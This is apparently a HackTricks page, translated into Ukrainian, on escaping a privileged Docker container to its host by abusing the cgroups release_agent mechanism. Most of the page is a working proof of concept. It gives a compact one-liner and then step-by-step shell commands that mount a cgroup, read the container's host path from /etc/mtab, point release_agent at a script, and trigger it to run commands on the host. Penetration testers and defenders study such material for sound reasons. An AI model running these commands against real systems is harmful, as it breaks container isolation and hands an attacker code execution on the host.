# Втеча з контейнера Docker через втечу cgroups release\_agent

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію в рекламі HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакінг-трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>


**Для отримання додаткових відомостей дивіться [оригінальний пост у блозі](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Це лише краткий огляд:

Оригінальний PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Доказ концепції (PoC) демонструє метод використання cgroups шляхом створення файлу `release_agent` та спровокування його виклику для виконання довільних команд на контейнерному хості. Ось розбір кроків, що включаються:

1. **Підготовка середовища:**
- Створюється каталог `/tmp/cgrp` для використання як точка монтування cgroup.
- Контролер cgroup RDMA монтується до цього каталогу. У випадку відсутності контролера RDMA рекомендується використовувати контролер cgroup `memory` як альтернативу.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Налаштування дочірнього Cgroup:**
   - В монтуємому каталозі cgroup створено дочірній cgroup з назвою "x".
   - Сповіщення увімкнені для cgroup "x", записавши 1 у файл notify_on_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Налаштування агента вивільнення:**
- Шлях контейнера на хості отримується з файлу /etc/mtab.
- Потім файл release_agent cgroup налаштовується на виконання скрипта з назвою /cmd, розташованого за отриманим шляхом хоста.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Створення та налаштування сценарію /cmd:**
- Сценарій /cmd створюється всередині контейнера та налаштовується для виконання ps aux, перенаправляючи вивід у файл з назвою /output у контейнері. Вказується повний шлях до /output на хості.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Запуск атаки:**
- Процес запускається в дитячому cgroup "x" і негайно припиняється.
- Це спричиняє виконання `release_agent` (скрипту /cmd), який виконує ps aux на хості та записує вивід до /output всередині контейнера.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
